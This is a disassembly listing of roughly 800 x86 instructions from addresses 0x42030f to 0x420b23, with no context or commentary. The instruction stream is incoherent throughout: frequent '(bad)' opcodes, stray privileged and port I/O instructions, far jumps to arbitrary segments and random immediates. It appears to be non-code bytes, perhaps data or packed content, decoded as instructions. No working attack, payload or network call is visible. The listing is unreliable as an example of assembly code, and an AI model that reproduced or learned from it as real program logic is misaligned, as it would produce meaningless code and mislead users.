  42030f:	stos   DWORD PTR es:[edi],eax
  420310:	pop    es
  420311:	sbb    al,0xc3
  420313:	cmp    DWORD PTR [ebx+0x0],esp
  420316:	adc    BYTE PTR [esi+0x27],bh
  420319:	add    ecx,edx
  42031b:	inc    eax
  42031c:	xor    dh,BYTE PTR [edx-0x72]
  42031f:	adc    DWORD PTR cs:[edx+esi*2],ecx
  420323:	add    al,BYTE PTR ds:0xd782e85e
  420329:	(bad)  
  42032a:	mov    al,ds:0xdf52ff31
  42032f:	popf   
  420330:	loopne 0x4202b9
  420332:	jecxz  0x4202c9
  420334:	push   esp
  420335:	add    DWORD PTR [edx+0x40],esp
  420338:	mov    BYTE PTR [edx-0x3cc89f6],al
  42033e:	mov    cl,0x16
  420340:	aad    0x30
  420342:	sub    DWORD PTR [eax+edx*8],edx
  420345:	imul   eax,DWORD PTR [esi+0x35ee87f3],0xa2109b2e
  42034f:	inc    eax
  420350:	cmp    BYTE PTR [edi+0xfa98cae],0xb1
  420357:	fnstcw WORD PTR [ebx-0xc428fca]
  42035d:	ret    
  42035e:	or     eax,0xa4082d5c
  420363:	arpl   WORD PTR [esi],sp
  420365:	fnclex 
  420367:	sbb    al,0xc1
  420369:	dec    esp
  42036a:	and    ah,BYTE PTR [ebp+0x64]
  42036d:	ins    BYTE PTR es:[edi],dx
  42036e:	call   0xe71635c9
  420373:	in     al,dx
  420374:	adc    eax,0x74d92213
  420379:	add    DWORD PTR [eax],0x371a54fd
  42037f:	sbb    eax,0x7247fc56
  420384:	cdq    
  420385:	jmp    0x3610010a
  42038a:	mov    eax,esp
  42038c:	cmp    esp,0xf2a9ae36
  420392:	adc    dh,bh
  420394:	jmp    0xa999:0x9ce903a9
  42039b:	add    DWORD PTR [ecx+0x54c5806c],ebp
  4203a1:	shl    BYTE PTR [esi],cl
  4203a3:	adc    eax,0x6cc7f456
  4203a8:	cdq    
  4203a9:	jmp    0x7c0fb92e
  4203ae:	popf   
  4203af:	loop   0x420385
  4203b1:	lods   eax,DWORD PTR ds:[esi]
  4203b2:	mov    edx,0x43f677f0
  4203b7:	(bad)  
  4203b8:	pusha  
  4203b9:	sub    al,0x14
  4203bb:	lods   al,BYTE PTR ds:[esi]
  4203bc:	fs and al,0x40
  4203bf:	popf   
  4203c0:	push   esi
  4203c1:	cld    
  4203c2:	outs   dx,DWORD PTR ds:[esi]
  4203c3:	outs   dx,DWORD PTR ds:[esi]
  4203c4:	cdq    
  4203c5:	jmp    0x760e014a
  4203ca:	jb     0x420400
  4203cc:	inc    ebx
  4203cd:	push   esp
  4203ce:	rcr    dl,1
  4203d0:	inc    esp
  4203d1:	add    BYTE PTR [eax+0x7d],ch
  4203d4:	out    dx,al
  4203d5:	add    ecx,ebp
  4203d7:	popa   
  4203d8:	scas   eax,DWORD PTR es:[edi]
  4203d9:	push   ebx
  4203da:	shl    DWORD PTR [ecx-0x5a],cl
  4203dd:	lea    esp,[eax+eax*1+0x13e8a651]
  4203e4:	push   0x1318fb56
  4203e9:	inc    esi
  4203ea:	(bad)  
  4203eb:	clc    
  4203ec:	adc    cl,BYTE PTR [edx-0x3f]
  4203ef:	push   ebx
  4203f0:	push   ecx
  4203f1:	mov    edi,0x9379c31
  4203f6:	iret   
  4203f7:	cli    
  4203f8:	cs pusha 
  4203fa:	inc    esp
  4203fb:	hlt    
  4203fc:	imul   ecx,DWORD PTR [ecx],0x1789f445
  420402:	xor    BYTE PTR [ecx],ch
  420404:	loopne 0x420454
  420406:	add    al,0xde
  420408:	std    
  420409:	sbb    eax,0xde7b6a3e
  42040e:	outs   dx,BYTE PTR ds:[esi]
  42040f:	adc    BYTE PTR [esi-0x3d82ef66],ch
  420415:	push   esp
  420416:	jne    0x4203f1
  420418:	xchg   BYTE PTR [edx-0x18],bl
  42041b:	out    0x4f,eax
  42041d:	push   ebp
  42041e:	lea    ebp,[esi+edi*1+0x54]
  420422:	sti    
  420423:	(bad)  
  420424:	ss nop
  420426:	pop    ds
  420427:	into   
  420428:	aaa    
  420429:	arpl   WORD PTR [ebp-0x47],ax
  42042c:	enter  0x50e5,0x6c
  420430:	in     eax,0x3d
  420432:	cli    
  420433:	mov    dh,0x2f
  420435:	or     DWORD PTR ds:0x5f0b5597,eax
  42043c:	adc    eax,0x66917fe9
  420441:	int    0x23
  420443:	and    DWORD PTR [eax],eax
  420445:	adc    ah,cl
  420447:	dec    eax
  420448:	adc    al,0x41
  42044a:	xchg   ebx,eax
  42044b:	cld    
  42044c:	add    BYTE PTR [ebx+0x4469fb1d],ch
  420452:	add    al,BYTE PTR ds:0x3bb83fba
  420458:	add    BYTE PTR [ecx+0x53],ah
  42045b:	mov    BYTE PTR [ebp+0xf],dh
  42045e:	cs push esp
  420460:	mov    edi,DWORD PTR ds:0xfa6c9c05
  420466:	fadd   DWORD PTR [edi+0x1022d04]
  42046c:	mov    eax,esi
  42046e:	fsub   QWORD PTR [esi+0x28]
  420471:	retf   
  420472:	pop    ebx
  420473:	ds lock retf 
  420476:	or     eax,0x18b5b00f
  42047b:	sti    
  42047c:	pop    esi
  42047d:	popf   
  42047e:	lahf   
  42047f:	rcl    DWORD PTR [eax],0xbb
  420482:	and    ecx,DWORD PTR [eax+0x55280aec]
  420488:	push   edi
  420489:	push   ds
  42048a:	xchg   esp,eax
  42048b:	not    DWORD PTR [eax-0x2f]
  42048e:	loopne 0x4204db
  420490:	mov    esp,DWORD PTR [ecx+0x4a]
  420493:	cmc    
  420494:	inc    DWORD PTR [esi-0x74bff4c0]
  42049a:	sar    DWORD PTR [ebx+0x46624174],cl
  4204a0:	cld    
  4204a1:	mov    bl,0x82
  4204a3:	add    eax,0xeb617b00
  4204a8:	test   DWORD PTR [eax],eax
  4204aa:	xchg   ebp,eax
  4204ab:	test   BYTE PTR [eax],ah
  4204ad:	test   DWORD PTR [esp+eax*4+0x15468d1c],ebx
  4204b4:	dec    esp
  4204b5:	push   0x77
  4204b7:	and    eax,0x830c0c69
  4204bc:	idiv   edi
  4204be:	push   esi
  4204bf:	push   eax
  4204c0:	or     eax,DWORD PTR [eax+0x3b]
  4204c3:	sar    DWORD PTR [ebx-0x77c69d8b],cl
  4204c9:	int    0x4a
  4204cb:	inc    edi
  4204cc:	push   ss
  4204cd:	push   DWORD PTR ds:0xb7fc2d8f
  4204d3:	(bad)  
  4204d4:	xor    al,0x12
  4204d6:	retf   0xbf2f
  4204d9:	(bad)  
  4204da:	mov    esp,0x2b5d3db7
  4204df:	dec    edx
  4204e1:	mov    dh,bh
  4204e3:	mov    esi,0x94b11b23
  4204e8:	int3   
  4204e9:	xor    ah,dh
  4204eb:	mov    ebp,DWORD PTR [ecx+0x34f8e903]
  4204f1:	adc    al,BYTE PTR [esi-0x270040cf]
  4204f7:	or     DWORD PTR [ecx+0x3746ddc7],eax
  4204fd:	jae    0x42048f
  4204ff:	int    0xba
  420501:	jecxz  0x420535
  420503:	mov    edi,DWORD PTR [edx+eax*2]
  420506:	mov    esi,0x62ffff4d
  42050b:	jecxz  0x420517
  42050d:	pop    esp
  42050e:	add    BYTE PTR [ebx-0x7e],dl
  420511:	(bad)  
  420512:	call   0xf0141e6a
  420517:	das    
  420518:	inc    ecx
  420519:	mov    ebp,0xcfde278a
  42051e:	push   esp
  42051f:	xchg   ebp,eax
  420520:	push   esp
  420521:	lahf   
  420522:	push   cs
  420523:	and    al,BYTE PTR [edx-0x78]
  420526:	mov    edi,0xfcd7170f
  42052b:	push   edi
  42052c:	retf   0x4012
  42052f:	(bad)  
  420530:	mov    DWORD PTR [esi+0x5c],0xc03df70c
  420537:	movzx  esp,WORD PTR [eax]
  42053a:	or     BYTE PTR [esi+0x2d],0x80
  42053e:	inc    edx
  42053f:	push   esi
  420540:	fidiv  DWORD PTR [esi]
  420542:	fidiv  DWORD PTR [esi-0x4db12957]
  420548:	mov    edi,0x534c7ec9
  42054d:	hlt    
  42054e:	ja     0x4205a3
  420550:	cdq    
  420551:	jmp    0xba2f3429
  420556:	adc    esp,DWORD PTR [edx-0x6fbb9327]
  42055c:	jmp    0x4205ba
  42055e:	leave  
  42055f:	sbb    DWORD PTR [edx+0x527be3cf],ebp
  420565:	pop    edx
  420566:	sbb    DWORD PTR [edx],edi
  420568:	jmp    0x1a230916
  42056d:	aam    0x7
  42056f:	xor    BYTE PTR [ecx],bl
  420571:	dec    esi
  420572:	mov    edi,0x399cd800
  420577:	aam    0x32
  420579:	push   edx
  42057a:	fwait
  42057b:	retf   0x6032
  42057e:	lods   al,BYTE PTR ds:[esi]
  42057f:	pop    ds
  420580:	sahf   
  420581:	pushf  
  420582:	and    DWORD PTR [esi],eax
  420584:	(bad)  
  420585:	fldl2t 
  420587:	xor    dh,BYTE PTR [eax-0x67]
  42058a:	stc    
  42058b:	ret    
  42058c:	mov    ebp,0x82b8295d
  420591:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420592:	xchg   esi,eax
  420593:	(bad)  
  420594:	fcomp  DWORD PTR [ebp+ecx*1+0x7c5212d4]
  42059b:	das    
  42059c:	sahf   
  42059d:	in     al,dx
  42059e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42059f:	adc    esp,DWORD PTR [edx]
  4205a1:	fldcw  WORD PTR [ebx+eax*2+0x11]
  4205a5:	jecxz  0x420581
  4205a7:	sbb    BYTE PTR [esi],bl
  4205a9:	out    0x29,eax
  4205ab:	add    al,0x6f
  4205ad:	mov    ebp,DWORD PTR [esi+0x2de2b588]
  4205b3:	push   ebx
  4205b4:	outs   dx,BYTE PTR ds:[esi]
  4205b5:	int3   
  4205b6:	mov    ebp,0x715032
  4205bb:	(bad)  [ecx]
  4205bd:	push   edx
  4205be:	mov    DWORD PTR [edx-0x4fa84bd0],ebp
  4205c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205c6:	xchg   DWORD PTR [ebp+0x644fa32e],ecx
  4205cc:	sub    cl,BYTE PTR [edx+0x50]
  4205cf:	add    esi,DWORD PTR [esi]
  4205d1:	sar    bl,0xba
  4205d4:	pushf  
  4205d5:	push   ebp
  4205d6:	adc    eax,0x995100d1
  4205db:	add    BYTE PTR [ecx+eiz*4-0x1b],ch
  4205df:	test   BYTE PTR [ecx+eiz*2-0x27],dl
  4205e3:	add    BYTE PTR [edx+ebx*1+0x4e],dh
  4205e7:	push   eax
  4205e8:	mov    edx,0x5619c02c
  4205ed:	mov    edx,0x9f4fb49
  4205f2:	loop   0x420634
  4205f4:	jmp    0xb6b797d3
  4205f9:	xor    bh,ah
  4205fb:	inc    esp
  4205fc:	(bad)  [ecx+0x7317e51]
  420602:	(bad)  
  420603:	ins    BYTE PTR es:[edi],dx
  420604:	jb     0x4205a8
  420606:	dec    ebp
  420607:	test   DWORD PTR [eax],esi
  420609:	or     eax,0x350152b7
  42060e:	in     eax,dx
  42060f:	add    ecx,ebp
  420611:	xor    al,0x42
  420613:	test   edi,edi
  420615:	hlt    
  420616:	test   eax,0xa275a48d
  42061b:	sti    
  42061c:	jl     0x42066b
  42061e:	lods   al,BYTE PTR ds:[esi]
  42061f:	data16 rcl BYTE PTR [eax-0x39],1
  420623:	clc    
  420624:	out    0x75,al
  420626:	adc    DWORD PTR [ecx],edx
  420628:	sub    DWORD PTR [esi+0x56],ebx
  42062b:	rcr    BYTE PTR [ebp-0x74],0x54
  42062f:	xor    cl,dh
  420631:	dec    ebp
  420632:	or     eax,0xdd3b0011
  420637:	jg     0x4205f9
  420639:	das    
  42063a:	aaa    
  42063b:	mov    DWORD PTR [eax],eax
  42063d:	add    bh,cl
  42063f:	xchg   ebp,eax
  420640:	outs   dx,DWORD PTR ds:[esi]
  420641:	sub    BYTE PTR [ebx+edx*8],dh
  420644:	mov    ebx,0x360a8b48
  420649:	dec    DWORD PTR [esi+0x31]
  42064c:	or     eax,DWORD PTR [eax+0x4b]
  42064f:	pop    eax
  420650:	mov    ebx,0x335c2c74
  420655:	add    BYTE PTR [ebx],bl
  420657:	fld    QWORD PTR [eax]
  420659:	jae    0x42069a
  42065b:	(bad)  
  42065c:	cli    
  42065d:	jmp    0xdcdb:0x335c00
  420664:	add    BYTE PTR [edx],bl
  420666:	cmp    edx,eax
  420668:	push   ebx
  420669:	add    edx,DWORD PTR [eax-0x37f1c65]
  42066f:	fild   DWORD PTR [eax]
  420671:	pop    esi
  420672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420673:	mov    bl,dh
  420675:	dec    DWORD PTR [esi]
  420677:	adc    DWORD PTR gs:[eax-0x5],eax
  42067b:	into   
  42067c:	rcr    BYTE PTR [ebx-0x7e],0x96
  420680:	dec    esi
  420681:	mov    edx,DWORD PTR [edi-0x789a7fd4]
  420687:	aad    0x68
  420689:	and    BYTE PTR [ebp+edx*1-0x5],al
  42068d:	(bad)  
  42068e:	mov    esi,0xcb401130
  420693:	push   edi
  420694:	mov    ebx,0x17749b74
  420699:	mov    eax,ds:0xff50dcfb
  42069e:	mov    esi,0x40114c
  4206a3:	mov    edx,DWORD PTR [edi-0x45]
  4206a6:	je     0x420633
  4206a8:	iret   
  4206a9:	inc    esi
  4206aa:	cld    
  4206ab:	dec    edx
  4206ac:	outs   dx,DWORD PTR ds:[esi]
  4206ad:	cld    
  4206ae:	jmp    DWORD PTR [edx-0x6e]
  4206b1:	cmp    BYTE PTR [edi-0x400aca11],0x9b
  4206b8:	add    DWORD PTR [edx+edi*2-0x6cffbd9a],0x22
  4206c0:	jns    0x420706
  4206c2:	add    BYTE PTR [esi-0x16],0xd3
  4206c6:	push   ebp
  4206c7:	fldln2 
  4206c9:	call   0xf4c49835
  4206ce:	jmp    0xf5eb:0x652dbb95
  4206d5:	call   0xb311ede5
  4206da:	push   ss
  4206db:	mov    eax,0x46437bf6
  4206e0:	push   ds
  4206e1:	ror    BYTE PTR [edi+0x15],cl
  4206e4:	and    eax,0x42a215a3
  4206e9:	test   bl,al
  4206eb:	push   esi
  4206ec:	test   ebx,0xff7e4223
  4206f2:	jmp    DWORD PTR [edx-0x53]
  4206f5:	ret    
  4206f6:	and    edx,DWORD PTR [edx+0x72]
  4206f9:	xor    ch,0xd7
  4206fc:	jne    0x4206e1
  4206fe:	and    ebp,DWORD PTR [ebp+0x7d]
  420701:	dec    ecx
  420702:	dec    edi
  420703:	aad    0x85
  420705:	jecxz  0x420776
  420707:	add    bh,bl
  420709:	jge    0x4206ee
  42070b:	pop    ss
  42070c:	das    
  42070d:	push   0xffffffff
  42070f:	jmp    DWORD PTR [edx+0x3e]
  420712:	rcl    BYTE PTR [edx+0xf],cl
  420715:	mov    ch,0x30
  420717:	or     al,0x27
  420719:	dec    edi
  42071b:	push   edx
  42071c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42071d:	and    al,0xd3
  42071f:	push   cs
  420720:	and    al,BYTE PTR [edx-0x7e]
  420723:	mov    edi,0x6be6920e
  420728:	inc    esi
  420729:	fstp   DWORD PTR [ecx-0x48]
  42072c:	jae    0x4206f1
  42072e:	stc    
  42072f:	and    BYTE PTR [ecx],0xf5
  420732:	std    
  420733:	shl    DWORD PTR [esi-0x3c],cl
  420736:	add    eax,0xdb4b85ac
  42073b:	add    al,0x62
  42073d:	inc    esp
  42073e:	xlat   BYTE PTR ds:[ebx]
  42073f:	cs shl ebp,1
  420742:	fnstsw WORD PTR [edx-0x70]
  420745:	jno    0x42071e
  420747:	ret    
  420748:	dec    ebp
  420749:	push   eax
  42074a:	mov    ebx,0xf9f5d12f
  42074f:	cs pop ss
  420751:	arpl   WORD PTR ds:0xe7424de8,bp
  420757:	repnz in eax,dx
  420759:	scas   al,BYTE PTR es:[edi]
  42075a:	and    edx,ecx
  42075c:	loop   0x420773
  42075e:	and    DWORD PTR [edx+0x69],eax
  420761:	fstp   DWORD PTR [ebx+edi*2]
  420764:	or     DWORD PTR [ecx+0x5d17f313],ebp
  42076a:	lods   al,BYTE PTR ds:[esi]
  42076b:	das    
  42076c:	add    al,ah
  42076e:	sub    edx,esp
  420770:	adc    al,0xad
  420772:	rol    DWORD PTR ds:0xb9d93565,0x1b
  420779:	dec    ebx
  42077b:	call   0xed57ea83
  420780:	sbb    ch,BYTE PTR [ebp-0x55]
  420783:	cwde   
  420784:	fwait
  420785:	lea    edi,[eax-0x57]
  420788:	add    esi,DWORD PTR [edx]
  42078a:	inc    ecx
  42078b:	inc    ebp
  42078c:	mov    dl,0xc4
  42078e:	dec    esi
  42078f:	dec    ax
  420791:	ins    DWORD PTR es:[edi],dx
  420792:	push   esp
  420793:	sub    DWORD PTR [esi+0x13944e5a],ebp
  420799:	(bad)  [ebp+eax*1-0x522cfd1]
  4207a0:	mov    eax,0xd7004165
  4207a5:	inc    esp
  4207a6:	dec    ebp
  4207a7:	sti    
  4207a8:	bound  esp,QWORD PTR [ebx+0x69d98752]
  4207ae:	fwait
  4207af:	adc    ch,al
  4207b1:	popa   
  4207b2:	pusha  
  4207b3:	ret    0x3737
  4207b6:	sbb    BYTE PTR [ecx+ebp*8],cl
  4207b9:	loopne 0x4207fd
  4207bb:	pop    esp
  4207bc:	sbb    cl,BYTE PTR [ebp+0x218848b6]
  4207c2:	dec    esi
  4207c3:	mov    BYTE PTR ds:0xae2fe24a,ah
  4207c9:	jl     0x4207b6
  4207cb:	sbb    dl,bh
  4207cd:	and    DWORD PTR [esi-0x7a],ecx
  4207d0:	rol    DWORD PTR [eax],0xea
  4207d3:	xor    BYTE PTR [ebx],cl
  4207d5:	ins    DWORD PTR es:[edi],dx
  4207d6:	xchg   edx,eax
  4207d7:	dec    esi
  4207d8:	sti    
  4207d9:	jmp    0xbcc9abe8
  4207de:	xor    eax,ebp
  4207e0:	inc    eax
  4207e1:	jmp    0x29e3b1df
  4207e6:	pop    esi
  4207e7:	test   al,0xfb
  4207e9:	xchg   edi,eax
  4207ea:	mov    ds,WORD PTR [edx-0x3e1602dc]
  4207f0:	mov    eax,ds:0xfba861a9
  4207f5:	aas    
  4207f6:	js     0x42082e
  4207f8:	xchg   DWORD PTR [ebp+0x2985ea05],esp
  4207fe:	in     al,0x59
  420800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420801:	jmp    0x44c7e167
  420806:	aam    0x59
  420808:	sahf   
  420809:	jmp    0x9dc9e16f
  42080e:	mov    ebp,0xe2b753dd
  420813:	mov    eax,ds:0x568ef524
  420818:	jl     0x4207df
  42081a:	ror    DWORD PTR [eax+edx*8+0x0],0xa4
  42081f:	mov    ds:0x15aac018,al
  420824:	pop    ds
  420825:	adc    al,0xd8
  420827:	cdq    
  420828:	imul   eax,DWORD PTR [ebp+eiz*8-0x34],0xce87243f
  420830:	aas    
  420831:	and    al,0x6f
  420833:	and    al,0x4b
  420835:	inc    DWORD PTR [eax]
  420837:	jbe    0x4208ae
  420839:	adc    eax,0xbf587b40
  42083e:	or     al,0xee
  420840:	and    BYTE PTR [edi],bl
  420842:	sbb    BYTE PTR [ebx-0x34],bh
  420845:	aas    
  420846:	and    al,0x5f
  420848:	and    eax,0xe9674488
  42084d:	push   ebp
  42084e:	push   eax
  42084f:	in     al,0x9d
  420851:	sbb    al,al
  420853:	fld    DWORD PTR es:[eax+eax*1]
  420857:	dec    ebx
  420858:	dec    esp
  420859:	sti    
  42085a:	(bad)  
  42085b:	cmp    edx,ebp
  42085d:	xor    edi,DWORD PTR [edi+edx*1+0xbfffb55]
  420864:	sub    DWORD PTR [edi+edx*2+0x74],edx
  420868:	int3   
  420869:	aas    
  42086a:	and    al,0xcb
  42086c:	dec    ebp
  42086d:	test   BYTE PTR ds:[edi+0x71],dl
  420871:	sti    
  420872:	dec    DWORD PTR [ebx]
  420874:	sub    DWORD PTR [esi+edx*2+0x44],edx
  420878:	and    DWORD PTR [edi],ebx
  42087a:	push   esp
  42087b:	(bad)  
  42087c:	fadd   DWORD PTR [eax]
  42087e:	add    BYTE PTR [edx-0x77],dh
  420881:	pop    ds
  420882:	pop    esp
  420883:	pushf  
  420884:	in     al,0x3c
  420886:	adc    BYTE PTR [ebx],cl
  420888:	fnstcw WORD PTR [edi-0x40]
  42088b:	pop    ss
  42088c:	out    0xfd,eax
  42088e:	je     0x420827
  420890:	fmul   QWORD PTR [ecx+0x40e7e335]
  420896:	add    BYTE PTR [edx-0x1d],ah
  420899:	push   edx
  42089a:	cld    
  42089b:	add    BYTE PTR [esi],dh
  42089d:	push   ss
  42089e:	pop    es
  42089f:	std    
  4208a0:	mov    edi,es
  4208a2:	mov    al,0x23
  4208a4:	inc    edx
  4208a5:	mov    edi,0x426e23b0
  4208aa:	mov    bl,0x5
  4208ac:	(bad)  
  4208ad:	(bad)  
  4208ae:	jecxz  0x4208c3
  4208b0:	test   DWORD PTR [ebp-0x55a80330],ecx
  4208b6:	push   cs
  4208b7:	inc    eax
  4208b8:	bound  eax,QWORD PTR [esp+ecx*8]
  4208bb:	mov    BYTE PTR [ebp-0x617f3605],ah
  4208c1:	idiv   BYTE PTR [esi]
  4208c3:	adc    esp,DWORD PTR [edx-0x1c]
  4208c6:	jns    0x4208b6
  4208c8:	loope  0x4208cd
  4208ca:	or     DWORD PTR [eax],eax
  4208cc:	(bad)  
  4208cd:	cmp    DWORD PTR [esi*2-0x67ed8ca2],ebp
  4208d4:	push   eax
  4208d5:	add    al,BYTE PTR ds:0xb3427481
  4208db:	pop    es
  4208dc:	sub    eax,0xca122c24
  4208e1:	das    
  4208e2:	mov    edi,0x99328bff
  4208e7:	jmp    FWORD PTR [edi+0x746412c3]
  4208ed:	add    al,BYTE PTR ds:0xcd461e81
  4208f3:	rcl    BYTE PTR [edi-0x18b1e439],0x7c
  4208fa:	sub    ecx,DWORD PTR [edi+0x78]
  4208fd:	inc    edx
  4208fe:	sub    al,0x72
  420900:	add    BYTE PTR [edx+0x70],bl
  420903:	into   
  420904:	imul   esp,DWORD PTR [edx+0xb],0x82710c13
  42090b:	inc    DWORD PTR [edx+0x4ffb85a2]
  420911:	(bad)
  420914:	mov    edx,DWORD PTR [ebx-0x67]
  420917:	jmp    0xfe8f2994
  42091c:	add    BYTE PTR [ebx+0x19],dh
  42091f:	and    BYTE PTR [ecx+0x61],al
  420922:	fstp   DWORD PTR [eax+edi*2-0x4cf2a677]
  420929:	(bad)  
  42092a:	fldl2t 
  42092c:	jle    0x42090e
  42092e:	dec    esp
  42092f:	jmp    0x42095c
  420931:	xchg   BYTE PTR [eax-0x32afd4c8],ch
  420937:	hlt    
  420938:	ret    
  420939:	jne    0x420997
  42093b:	ins    BYTE PTR es:[edi],dx
  42093c:	sub    BYTE PTR [edi+0x4b],ch
  42093f:	retf   0x15d4
  420942:	shr    DWORD PTR [ebp+0x65],0x9d
  420946:	fldcw  WORD PTR [ecx+eax*4-0x1b]
  42094a:	dec    ebp
  42094b:	mov    dl,0x2b
  42094d:	lds    edi,FWORD PTR [ebp-0x569dfc19]
  420953:	xchg   ecx,eax
  420954:	cmp    ebp,ecx
  420956:	fsubr  st,st(1)
  420958:	xchg   BYTE PTR [ecx],ah
  42095a:	out    0x6c,al
  42095c:	inc    esp
  42095d:	scas   eax,DWORD PTR es:[edi]
  42095e:	out    0x5c,al
  420960:	jns    0x420937
  420962:	dec    ebp
  420963:	sub    BYTE PTR [ebx],0x0
  420966:	add    eax,0x6203e9de
  42096b:	push   ebp
  42096c:	test   eax,0xe88961b0
  420971:	cmp    al,0x22
  420973:	or     BYTE PTR [edx],ch
  420975:	cmp    eax,0x186ea522
  42097a:	je     0x4209b9
  42097c:	fld    DWORD PTR [eax]
  42097e:	(bad)  
  42097f:	fstp   DWORD PTR [ecx+eax*4-0x4b]
  420983:	dec    esp
  420984:	inc    edx
  420985:	sub    esi,DWORD PTR [edi]
  420987:	test   eax,0x99f45c7f
  42098c:	add    cl,ch
  42098e:	dec    esp
  42098f:	cmp    ebp,eax
  420991:	loope  0x420964
  420993:	dec    ebp
  420994:	sti    
  420995:	ins    DWORD PTR es:[edi],dx
  420996:	fld    QWORD PTR es:[edx+edx*1+0x6400d95e]
  42099e:	jecxz  0x420a1e
  4209a0:	cld    
  4209a1:	push   cs
  4209a2:	jns    0x42093e
  4209a4:	lea    ebp,[esi+edx*1+0x4f]
  4209a8:	sti    
  4209a9:	(bad)  
  4209aa:	mov    cl,0x4d
  4209ac:	adc    eax,0x997275
  4209b1:	pop    esp
  4209b2:	jecxz  0x420a32
  4209b4:	cld    
  4209b5:	out    0x48,al
  4209b7:	call   0x9968:0x4ea26c52
  4209be:	push   es
  4209bf:	or     al,BYTE PTR [ecx]
  4209c1:	cmp    DWORD PTR [esi+0x8],eax
  4209c4:	jb     0x4209ae
  4209c6:	popa   
  4209c7:	pop    eax
  4209c8:	(bad)  
  4209c9:	fld    DWORD PTR [eax]
  4209cb:	fadd   QWORD PTR [ecx-0x5]
  4209ce:	out    0xcd,al
  4209d0:	add    BYTE PTR [eax],0xe9
  4209d3:	popa   
  4209d4:	pusha  
  4209d5:	push   ebp
  4209d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209d7:	adc    al,0x9a
  4209d9:	lea    ebp,[ecx+esi*4+0x4f]
  4209dd:	sti    
  4209de:	xchg   esi,eax
  4209df:	dec    ecx
  4209e0:	popa   
  4209e1:	sub    cl,BYTE PTR [esi-0x7ab29e88]
  4209e7:	lahf   
  4209e8:	and    ch,al
  4209ea:	fisub  DWORD PTR [ebp+0x4a]
  4209ed:	sti    
  4209ee:	ins    DWORD PTR es:[edi],dx
  4209ef:	pushf  
  4209f0:	mov    cl,0xb
  4209f2:	gs loopne 0x420a3e
  4209f5:	sti    
  4209f6:	jmp    0x5cf26175
  4209fb:	dec    eax
  4209fc:	dec    ebp
  4209fd:	push   eax
  4209fe:	rcl    DWORD PTR [ecx+0x6ae9406b],0x57
  420a05:	nop
  420a06:	add    BYTE PTR [ecx],ah
  420a08:	(bad)  
  420a09:	cld    
  420a0a:	push   0xd4c5
  420a0f:	jmp    0x4209fe
  420a11:	mov    dh,0x6f
  420a13:	mov    edx,0xbbc481d5
  420a18:	push   edx
  420a19:	repz call ebp
  420a1c:	jae    0x420a81
  420a1e:	add    al,0xba
  420a20:	aad    0x0
  420a22:	lea    edi,[esi]
  420a24:	(bad)  
  420a25:	idiv   bh
  420a27:	fs es arpl ax,sp
  420a2b:	sub    dl,BYTE PTR [esi]
  420a2d:	sti    
  420a2e:	inc    BYTE PTR [eax]
  420a30:	scas   al,BYTE PTR es:[edi]
  420a31:	and    eax,0x8d7b400a
  420a36:	add    cl,BYTE PTR ss:[edx+0x487700d5]
  420a3d:	imul   edi,DWORD PTR [edi],0x5e
  420a40:	sub    eax,0x21b83ec2
  420a45:	aad    0x50
  420a47:	(bad)  
  420a48:	imul   edx,DWORD PTR ds:0xbf5e4b40,0x4b9d480c
  420a53:	retw   0xe388
  420a57:	lea    ecx,[esi+0x4b6a4bb5]
  420a5d:	ror    BYTE PTR [esi-0x30d2e70],1
  420a63:	lea    eax,[esi-0x1b000933]
  420a69:	les    ebp,FWORD PTR [esi-0x48]
  420a6c:	mov    esp,0xfb01df88
  420a71:	fadd   QWORD PTR [eax]
  420a73:	call   0x3efc0b
  420a78:	pushf  
  420a79:	xchg   ebp,eax
  420a7a:	sbb    al,al
  420a7c:	mov    WORD PTR [ebp-0x429df218],ss
  420a82:	jae    0x420a33
  420a84:	out    0x97,eax
  420a86:	sub    edi,esp
  420a88:	mov    bh,BYTE PTR [esi-0x2]
  420a8b:	call   DWORD PTR [eax-0x5e39390e]
  420a91:	gs jl  0x420a7f
  420a94:	add    cl,ah
  420a96:	push   es
  420a97:	adc    eax,0x7c871451
  420a9c:	stc    
  420a9d:	dec    eax
  420a9e:	xor    eax,edx
  420aa0:	mov    BYTE PTR [ebx+0x52480bef],dh
  420aa6:	jb     0x420aa7
  420aa8:	and    BYTE PTR [edx-0x46cf523a],0x63
  420aaf:	aam    0x69
  420ab1:	arpl   WORD PTR [edi+0x28],sp
  420ab4:	adc    dl,BYTE PTR [esi]
  420ab6:	and    bh,BYTE PTR [edi-0x548d1901]
  420abc:	adc    WORD PTR [ebp-0x63ed0446],si
  420ac3:	jmp    DWORD PTR [edi+0x72]
  420ac6:	push   ecx
  420ac7:	mov    edi,0xcf255cff
  420acc:	cpuid  
  420ace:	xor    bh,BYTE PTR [edx-0x41]
  420ad1:	(bad)  
  420ad2:	push   eax
  420ad3:	jb     0x420b17
  420ad5:	dec    esi
  420ad6:	loop   0x420b4b
  420ad8:	inc    edx
  420ad9:	cmp    al,BYTE PTR [edx]
  420adb:	je     0x420b1f
  420add:	xor    al,BYTE PTR [edx]
  420adf:	sub    dh,BYTE PTR [edx+0x2e]
  420ae2:	mov    ecx,0x4d25f7c2
  420ae7:	retf   
  420ae8:	cpuid  
  420aea:	xor    bh,BYTE PTR [edx-0x41]
  420aed:	mov    ?,WORD PTR [ecx]
  420aef:	sub    BYTE PTR [edx+0x16],dh
  420af2:	iret   
  420af3:	stos   BYTE PTR es:[edi],al
  420af4:	test   DWORD PTR ds:0x542f4d,0xcbfcd8fd
  420afe:	gs cdq 
  420b00:	jmp    0xed0eb883
  420b05:	jl     0x420aa7
  420b07:	inc    ebp
  420b08:	ds neg esi
  420b0b:	int    0x45
  420b0d:	sub    BYTE PTR [eax-0x1b],dh
  420b10:	(bad)  
  420b11:	ret    
  420b12:	int    0x5a
  420b14:	and    DWORD PTR [eax],ebp
  420b16:	loopne 0x420b66
  420b18:	mov    ch,0x13
  420b1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b1b:	fdivrp st(5),st
  420b1d:	add    esp,DWORD PTR [edx-0x27]
  420b20:	jo     0x420acb
  420b22:	popa   
  420b23:	push   edx
